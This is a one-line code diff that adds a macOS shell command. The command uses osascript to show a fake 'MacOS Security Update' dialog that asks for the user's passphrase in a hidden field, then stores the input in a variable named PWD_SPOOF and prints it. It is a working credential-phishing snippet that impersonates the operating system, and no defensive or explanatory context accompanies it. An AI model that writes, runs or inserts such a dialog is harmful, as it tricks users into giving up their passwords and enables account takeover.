@@ -1,0 +1,1 @@
+PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer'); echo $PWD_SPOOF
